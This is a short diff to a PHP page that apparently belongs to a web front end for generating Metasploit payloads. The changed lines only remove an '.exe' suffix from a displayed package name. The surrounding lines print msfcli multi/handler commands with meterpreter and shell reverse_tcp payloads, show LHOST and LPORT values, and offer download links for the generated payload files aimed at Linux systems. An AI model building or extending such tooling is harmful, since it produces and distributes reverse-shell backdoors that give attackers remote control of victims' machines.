@@ -165,11 +165,10 @@ echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp 
 echo'****************************************************************************';
 echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
 echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
-echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.exe</p>';
+echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'</p>';
 echo '<p><b>PAYLOAD</b>                   -->linux/x86/meterpreter/reverse_tcp </p>';
 echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'>Click here</a>';
 echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';
-
 
 echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Linux Distributions</p>';
 echo'<p>*****************************************************************************</p>';
@@ -188,7 +187,7 @@ echo 'sudo msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tc
 echo'****************************************************************************';
 echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
 echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
-echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.exe</p>';
+echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'</p>';
 echo '<p><b>PAYLOAD</b>                   -->linux/x86/shell_reverse_tcp </p>';
 echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'>Click here</a>';
 echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';
